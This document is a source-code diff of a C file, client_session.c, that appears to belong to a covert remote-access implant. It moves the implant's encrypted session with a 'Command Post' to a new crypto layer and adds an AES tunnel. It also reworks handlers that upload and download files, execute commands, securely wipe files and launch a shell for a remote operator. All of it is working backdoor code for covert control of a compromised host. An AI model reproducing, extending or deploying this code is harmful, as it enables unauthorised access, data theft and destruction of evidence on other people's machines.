@@ -1,8 +1,4 @@
 #include "client_session.h"
-#include "debug.h"
-#include "polarssl/crypto.h"
-
-#include "compat.h"
 
 #if defined LINUX || defined SOLARIS
 #include <time.h>
@@ -17,6 +13,7 @@
 #define _USE_32BIT_TIME_T
 #define _INC_STAT_INL
 #include <sys/stat.h>
+#include "crypto.h"
 
 static int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut);
 static int UploadFile(char* path, unsigned long size, int sock);
@@ -30,9 +27,8 @@ static int hstat( int fd );
 const unsigned long CMD_TIMEOUT = 5*60*1000; // 5 minutes
 const unsigned long PKT_TIMEOUT = 30*1000; // 30 sec.
 
-static havege_state trig_hs;
-static ssl_context	trig_ssl;
-static ssl_session	trig_ssn;
+crypt_context *cp;		// Command Post network connection context
+
 #define _fstat fstat
 
 //******************************************************************
@@ -82,8 +78,15 @@ int write_all( int fd, void *ptr, int n )
 	return ( n - nleft );
 }
 
-//******************************************************************
-//Waits for data to arrive on the socket and reads it in untill the buffer is full.
+/*!
+ * Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut)
+ * @brief Waits for data to arrive on the socket and reads it in until the buffer is full.
+ * @param sock - socket on which to receive
+ * @param buf - receiving buffer
+ * @param size - size of receiving buffer
+ * @param timeOut - Stop and return on timeout.
+ * @return
+ */
 int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut)
 {
 	unsigned long		receivedTotal = 0;
@@ -92,59 +95,50 @@ int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long time
 	struct timeval		timeout;
 
 	timeout.tv_sec = timeOut/1000;
-
 	FD_ZERO(&readFDs);
 
-	if(sock != INVALID_SOCKET)
-	{
+	if(sock != INVALID_SOCKET) {
 		FD_SET(sock, &readFDs);
 	}
 
 	//while there is room in the buffer keep going
-	while(receivedTotal < size)
-	{
-		if( select(sock+1,&readFDs,0,0,&timeout))
-		{
+	while(receivedTotal < size) {
+		if (select(sock+1,&readFDs,0,0,&timeout)) {
 //			received = recv(sock,(char*)buf + receivedTotal,size - receivedTotal,0);
-			received = crypt_read( &trig_ssl, buf + receivedTotal, size - receivedTotal );
-
-			if(received == SOCKET_ERROR)
-			{
-				return SOCKET_ERROR;//recv sent back an error
+			if ((received = crypt_read(cp, buf + receivedTotal, size - receivedTotal)) < 0) {
+				DLX(4, printf("crypt_read() failed: "); print_ssl_error(received));
+				return SOCKET_ERROR;
 			}
+			if(received == 0)
+				break;
 
-
-			if(received > 0)
-			{
-				receivedTotal += received;
-			}
-			else if(received == 0)
-			{
-				return receivedTotal;
-			}
+			receivedTotal += received;
 		}
 	}
 	return receivedTotal;
 }
 
 //******************************************************************
+/*!
+ * Upload a file from the command post to a local file
+ * @param path - path and filename of the local file
+ * @param size - size of the file
+ * @param sock - socket
+ * @return - Success = 0, Failure = -1
+ */
 int UploadFile(char* path, unsigned long size, int sock)
 {
 	REPLY ret;					// Reply struct
 	DATA data;					// File transfer Data struct
-	unsigned long retVal;
-//	D( unsigned long written; )
+	int retval;
+	int bytes_read = 0;
+	unsigned int received = 0, written = 0;
 
 	FILE* fd;
 
-	// Fill reply with random bytes
- 	GenRandomBytes((unsigned char *)&ret, sizeof(ret));
-
 	// Attempt to create local file
-	
 	fd = fopen(path,"wb");
-	if(fd == 0)
-	{
+	if(fd == 0) {
 		return errno;
 	}
 	DLX(2, printf("Opened path: %s\n", path));
@@ -152,65 +146,68 @@ int UploadFile(char* path, unsigned long size, int sock)
 	// Set successful reply
 	ret.reply = 0;
 
-	retVal = 0;
-
 	//send reply (guessing it lets client know we are ready to receive data of file?)
 //	if(SOCKET_ERROR == send(sock,(const char*) &ret, sizeof(REPLY),0))
 	// TODO <= 0
-	if ( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*) &ret, sizeof(REPLY) ) )
-	{
-		retVal = -1;
+	if (crypt_write(cp, (unsigned char*) &ret, sizeof(REPLY)) < 0) {
 		goto Error;
 	}
-
-	DLX(2, printf("Acknowledged UploadFile command of size %d\n", (int)size));
+	DLX(2, printf("Acknowledged UploadFile with file size of %lu bytes\n", size));
 	
-	while (size)
-	{
-//		D( printf( " DEBUG: %d bytes remaining\n", (int)size ); )
-		// Read 4k block of file data from client
-		// minimum is one 4k block
-		// TODO: do we need to call Receive() or just call crypt_read() directly??
-		if ( SOCKET_ERROR == Receive(sock,(unsigned char*) &data, sizeof(DATA), PKT_TIMEOUT))
+	while (received < size) {
+		// Read bytes from network
+		if ((bytes_read = Receive(sock,(unsigned char*) &data, (size-received > sizeof(DATA)) ? sizeof(DATA) : size-received, PKT_TIMEOUT)) <= 0) {
+			if (bytes_read == 0) {
+				DLX(4, printf("Session disconnected\n"));
+				break;
+			}
+			DLX(4, printf("ERROR: Receive()\n"));
 			goto Error;
-		
-		if (size > sizeof(DATA))
-		{
-			// Write block
-			(void) fwrite( data.data, sizeof(DATA), 1, fd );
-//			written = fwrite( data.data, sizeof(DATA), 1, fd );
-//			D( printf( " DEBUG: %d bytes written\n", (int)written ); )
-			size -= sizeof(DATA);
 		}
-		else
-		{
-			// Write remaining bytes
-			(void) fwrite( data.data, size, 1, fd );
-//			written = fwrite( data.data, size, 1, fd );
-//			D( printf( " DEBUG: %d bytes written\n", (int)written ); )
-			size = 0;
+		DLX(8, printf("Receive() bytes_read: %d\n", bytes_read));
+		// Write bytes to file
+		written = 0;
+		while (written < (unsigned int)bytes_read) {
+			if ((retval = fwrite( data.data, 1, bytes_read, fd )) == 0) {
+				if (ferror(fd)) {
+					DLX(4, printf("ERROR: fwrite()\n"));
+					goto Error;
+				}
+				break;
+			}
+			written += retval;
 		}
-		
+		received += bytes_read;
+		DLX(8, printf("Bytes received: %u\n", received));
 	}
 
-	fclose(fd);
-	// TODO: what do we want retVal to be? 0 on success?
-	return retVal;
+	if (fclose(fd) != 0) {
+		DLX(4, printf("fclose() failed\n"));
+		return -1;
+	}
+	return 0;
 
 Error:
-	retVal = -1;
 	fclose(fd);
 	unlink(path);
-	return retVal;
+	return -1;
 }
 
 //******************************************************************
+/*!
+ * Download a file from the local system to the command post
+ * @param path - complete path and filename
+ * @param size - size of file
+ * @param sock - socket
+ * @return
+ */
 int DownloadFile(char *path, unsigned long size, int sock)
 {
 	REPLY ret;		// Reply struct
-	DATA data;		// File transfer Data struct
+	unsigned char data[DATA_BUFFER_SIZE];
 	struct stat buf;
 	FILE *fd;
+	int	bytes_read, bytes_written;
 
 	//TODO: Review and fix/remove this.
 	// to silence compiler warnings. this var no longer needed because of the 
@@ -241,46 +238,46 @@ int DownloadFile(char *path, unsigned long size, int sock)
 		// double-check size calculation
 		size = hstat( fileno( fd ) );
 	}
-
-	DLX(2, printf("Total fstat() size: %i\n", (int)buf.st_size));
-	DLX(2, printf("Total size: %i\n", (int)size));
-	DLX(2, printf("Remote file size is %ld\n", size));
+	DLX(2, printf("File: %s\n", path));
+	DLX(2, printf("File size: %ld\n", size));
 
 	// Setup reply struct
 	ret.reply = 0;
 	// Place file size in struct padding (Download was a late addition. Hence the hack.)
 	ret.padding = htonl(size);
 
-	//send reply with the file size so the client knows
-//	if(SOCKET_ERROR == send(sock, (const char*) &ret, sizeof(REPLY), 0))
-	if ( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(REPLY) ) )
+	// Send reply with the file size so the client knows
+	DLX(4, printf("Sending reply: reply = %lu, length = 0x%lx\n", ret.reply, ret.padding));
+	if (crypt_write(cp, (unsigned char*)&ret, sizeof(REPLY)) < 0)
 	{
-		DLX(2, printf("crypt_write() socket error\n"));
+		DLX(2, printf("crypt_write() error\n"));
 		goto Error;
 	}
 
-	while (size)
-	{
-		if (size > sizeof(DATA))
-		{
-			(void)fread(&data.data,sizeof(DATA),1,fd);
-			// Read block
-			size -= sizeof(DATA);
-		}
-		else
-		{
-			(void)fread(&data.data,sizeof(DATA),1,fd);
-			// Read remaining bytes
-			size = 0;
-		}
-
-		//write out the file to the client
-//		if(SOCKET_ERROR == send(sock,(const char*)(unsigned char*) &data,sizeof(DATA), 0))
-		if ( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&data, sizeof(DATA) ) )
-		{
-			DLX(3, printf("crypt_write() socket error\n"));
+	bytes_read = 0;
+	while (size) {		// Read file
+		DLX(8, printf("Reading file: %s of size %lu\n", path, size));
+		if ((bytes_read = fread(data, 1, size > DATA_BUFFER_SIZE ? DATA_BUFFER_SIZE : size, fd)) <= 0) {
+			if (feof(fd))	// EOF
+				break;
+			DLX(4, printf("Error reading file: %s, errno = \n", path));
 			goto Error;
 		}
+		DPB(8, "File bytes read", data, bytes_read);
+		bytes_written = 0;
+		do {
+			int rv;
+			// Write file to the network
+			DLX(8, printf("Writing data of length %u to network\n", bytes_read));
+			if ((rv = crypt_write(cp, data, bytes_read)) < 0) {
+				if (bytes_written == POLARSSL_ERR_NET_WANT_WRITE)
+					continue;
+				DLX(3, printf("crypt_write() failed:"); print_ssl_error(rv));
+				goto Error;
+			}
+			bytes_written += rv;
+		} while (bytes_read > bytes_written);
+		size -= bytes_read;
 	}
 
 	fclose( fd );
@@ -349,14 +346,14 @@ int SecureDelete( char *path )
 	//check to see if file opened
 	if(fd == 0)
 	{
-		D( perror( "fopen()" ); )
+		D(perror( "fopen()"));
 		return errno;
 	}
 
 	// Get file size
 	if( _fstat(fileno(fd),&buf) != 0)
 	{
-		D( perror( "fstat()" ); )
+		D(perror( "fstat()"));
 		goto Error;
 	}
 	fsize = buf.st_size;
@@ -379,7 +376,7 @@ int SecureDelete( char *path )
 		numWritten = fwrite( zerobuf, 1, MIN( 4096, remaining) ,fd);
 		if(numWritten <= 0)
 		{
-			D( perror( "fwrite()");)
+			D(perror( "fwrite()"));
 			goto Error;
 		}
 		remaining -= numWritten;
@@ -433,145 +430,165 @@ unsigned long StartClientSession( int sock )
 	// we have an established TCP/IP connection
 	// although we consider this the SERVER, for the SSL/TLS transaction, 
 	// the implant acts as a SSL client
-	if ( crypt_setup_client( &trig_hs, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
+	if ((cp = crypt_setup_client(&sock)) == NULL)
 	{
 		DLX(2, printf("ERROR: crypt_setup_client()\n"));
-			crypt_cleanup( &trig_ssl);
+			crypt_cleanup(cp);
 		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
 	}
 
 	// start TLS handshake
 	DL(3);
-	if ( crypt_handshake(&trig_ssl) != SUCCESS )
+	if ( crypt_handshake(cp) != SUCCESS )
 	{
 		DLX(2, printf("ERROR: TLS connection with TLS server failed to initialize.\n"));
-			crypt_cleanup( &trig_ssl);
+			crypt_cleanup(cp);
 		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
 	}
 	DLX(3, printf("TLS handshake complete.\n"));
 
+	// Create AES Tunnel
+	if (aes_init(cp) == 0) {
+		DLX(4, printf("aes_init() failed\n"));
+		goto Exit;
+	}
 
-		while(!fQuit)
-		{
-			COMMAND cmd;
-			REPLY ret;
+	while(!fQuit)
+	{
+		COMMAND cmd;
+		REPLY ret;
+		int r;
 
-			// Fill reply buffer with random bytes
-			GenRandomBytes((unsigned char *)&ret, sizeof(REPLY));
+		// Fill reply buffer with random bytes
+		GenRandomBytes((unsigned char *)&ret, sizeof(REPLY));
 
-			// Get command struct. Willing to wait 5 minutes between commands
+		// Get command, waiting up to SESSION_TIMEOUT seconds between commands.
+		// If a command is not received before the timeout expires, exit.
+		// This timeout is reset each time a command is received.
+		alarm( SESSION_TIMEOUT );
+		memset(&cmd, 0, sizeof(COMMAND));		// Clear any previous commands
+		if ((r = crypt_read(cp, (unsigned char *)&cmd, sizeof(COMMAND))) < 0 ) {
+			switch(r) {
+			case POLARSSL_ERR_NET_WANT_READ:
+				DLX(4, printf("crypt_read() POLARSSL_ERR_NET_WANT_READ, continue reading"));
+				continue;
+				break;
+			case POLARSSL_ERR_SSL_PEER_CLOSE_NOTIFY:
+				DLX(4, printf("crypt_read() POLARSSL_ERR_SSL_PEER_CLOSE_NOTIFY, exiting"));
+				goto Exit;
+				break;
 
-			// set timeout.  if we don't receive a command within this timeframe, assume we are hung and exit
-			// this timeout is reset each time a command is received.
-			alarm( SESSION_TIMEOUT );
-
-			//		Receive(sock, (unsigned char*)&cmd, sizeof(cmd), CMD_TIMEOUT);
-			//TODO: Fix this. There's nothing in this loop after removing the WIN32 code.
-			if( 0 > crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ) ) )
-			{
-			}
-			alarm( 0 );
-
-			// Expand the cmd.path to the proper path resolving ENVIRONMENT variables
-			if( commandpath != 0 ) 
-			{
-				free( commandpath );
-				commandpath = 0;
-			}
-			ExpandEnvStrings(cmd.path, &commandpath);
-
-			DLX(2, printf ("\tExecuting command: 0x%0x\n", cmd.command));
-
-			//act on command, THESE FOLLOWING VALUES ARE DEFINED IN THE Shell.h file.
-			switch(cmd.command)
-			{
-				case EXIT:
-					DLX(2, printf("EXIT command received.\n"));
-						fQuit = 1;
-					ret.reply = 0;
-					break;
-
-				case UPLOAD:
-					DLX(2, printf("UPLOAD command received.\n"));
-						ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
-					break;
-
-				case DOWNLOAD:
-					DLX(2, printf("DOWNLOAD command received.\n"));
-						ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
-					break;
-
-				case EXECUTE:
-					DLX(2, printf("EXECUTE command received.\n"));
-						memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
-					ret.reply = Execute( commandpath );
-					break;
-
-
-				case DELETE:
-					DLX(2, printf("DELETE command received, attempting SECURE DELETE...\n"));
-						ret.reply = SecureDelete(commandpath);
-
-					//If SecureDelete failed, ret.reply is not 0 so try to use DelFile function
-					if (ret.reply != 0)
-					{
-						DLX(2, printf("Now attempting to UNLINK the file: %s\n", commandpath));
-							ret.reply = DelFile(commandpath);
-					}
-					break;
-//TODO: The following code (from here through the exit) needs to be reviewed.
-				case SHUTDOWNBOTH:
-					DLX(2, printf("SHUTDOWN command received.\n"));
-					fQuit = 1;
-					ret.reply = 0;
-					crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) );
-					//			send(sock, (const char*)&ret, sizeof(ret),0);
-					closesocket(sock);
-					sock = INVALID_SOCKET;
-					retval = SHUTDOWN;
-					//TODO: Linux used "break", Solaris used "goto Exit". Investigate this further.
-#ifdef LINUX
-					break;
-#else
+			default:
+				if (r < 0) {
+					DLX(4, printf("crypt_read() failed: "); print_ssl_error(r));
 					goto Exit;
+				}
+				DLX(4, printf("crypt_read() returned: %d (0x%x)", r, r));
+				break;
+			}
+
+		}
+		alarm( 0 );
+
+		// Expand the cmd.path to the proper path resolving ENVIRONMENT variables
+		if( commandpath != 0 )
+		{
+			free( commandpath );
+			commandpath = 0;
+		}
+		ExpandEnvStrings(cmd.path, &commandpath);
+
+		DLX(2, printf ("\tExecuting command: 0x%0x\n", cmd.command));
+
+		//act on command, THESE FOLLOWING VALUES ARE DEFINED IN THE Shell.h file.
+		switch(cmd.command) {
+
+			case 0:
+			case EXIT:
+				DLX(2, printf("EXIT command received.\n"));
+				fQuit = 1;
+				ret.reply = 0;
+				break;
+
+			case UPLOAD:
+				DLX(2, printf("UPLOAD command received.\n"));
+				ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
+				break;
+
+			case DOWNLOAD:
+				DLX(2, printf("DOWNLOAD command received.\n"));
+				ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
+				break;
+
+			case EXECUTE:
+				DLX(2, printf("EXECUTE command received.\n"));
+				memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
+				ret.reply = Execute( commandpath );
+				break;
+
+			case DELETE:
+				DLX(2, printf("DELETE command received, attempting SECURE DELETE...\n"));
+				ret.reply = SecureDelete(commandpath);
+
+				//If SecureDelete failed, ret.reply is not 0 so try to use DelFile function
+				if (ret.reply != 0) {
+					DLX(2, printf("Now attempting to UNLINK the file: %s\n", commandpath));
+					ret.reply = DelFile(commandpath);
+				}
+				break;
+
+	//TODO: The following code (from here through the exit) needs to be reviewed.
+			case SHUTDOWNBOTH:
+				DLX(2, printf("SHUTDOWN command received.\n"));
+				fQuit = 1;
+				ret.reply = 0;
+				crypt_write(cp, (unsigned char*)&ret, sizeof(ret));
+				crypt_cleanup(cp);
+				closesocket(sock);
+				sock = INVALID_SOCKET;
+				retval = SHUTDOWN;
+				//TODO: Linux used "break", Solaris used "goto Exit". Investigate this further.
+#ifdef LINUX
+				break;
+#else
+				goto Exit;
 #endif
 
-				case LAUNCHTRUESHELL:
-					DLX(2, printf("LAUNCHTRUESHELL command received.\n"));
-					ret.reply = launchShell(commandpath);
-					D( printf( " DEBUG: launchshell() returned %i\n", (int)ret.reply ); )
-					break;
+			case LAUNCHTRUESHELL:
+				ret.reply = launchShell(commandpath);
+				DLX(2, printf("LAUNCHTRUESHELL command received, returned: %i\n", (int)ret.reply));
+				break;
 
-				default:
-					DLX(2, printf("Command not recognized.\n"));
-					fQuit = 1;
-					break;
+			default:
+				DLX(2, printf("Command not recognized.\n"));
+				continue;
+			//	fQuit = 1;
+			//	break;
 
-			}
-
-			// Send reply
-			//		if( SOCKET_ERROR == send(sock, (const char*)&ret, sizeof(ret),0))
-			if( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) ) )
-			{
-				closesocket(sock);
-				goto Exit;
-			}
 		}
+
+		// Send reply
+		if (crypt_write(cp, (unsigned char*)&ret, sizeof(ret)) < 0) {
+			closesocket(sock);
+			goto Exit;
+		}
+	}
 
 		// TODO: Instead of allowing this function to return to connectShell and then trigger_exec where then
 		// retval == SHUTDOWN is processed, why not process it here?  it might eliminate some tracing
 		// back and forth.
 Exit:
-		if( commandpath != 0 ) free( commandpath );
-		crypt_cleanup( &trig_ssl);
-
-		return retval;
+	if( commandpath != 0 )
+		free( commandpath );
+	aes_terminate(cp);
+	crypt_cleanup(cp);
+	return retval;
 }
 
 int Execute( char *path )
 {
 	//Assume success...
-	int rv;
+	D(int rv);
 	int status=0; 
 	pid_t pid;
 	char* receivedCommand;
@@ -606,7 +623,7 @@ int Execute( char *path )
 	else
 	{
 		//This is the parent process, Wait for the child to complete.
-		rv = waitpid( pid, &status, 0);
+		D(rv =) waitpid( pid, &status, 0);
 		DLX(2, printf("waitpid() returned %d while waiting for pid %d\n", rv, (int)pid));
 		if (WIFEXITED(status))
 		{
@@ -619,7 +636,7 @@ int Execute( char *path )
 
 	}
 
-	DLX(2, printf("Received Command: %s, Status: %i", receivedCommand, status));
+	DLX(2, printf("Received Command: %s, Status: %i\n", receivedCommand, status));
 	return(status);
 }
     
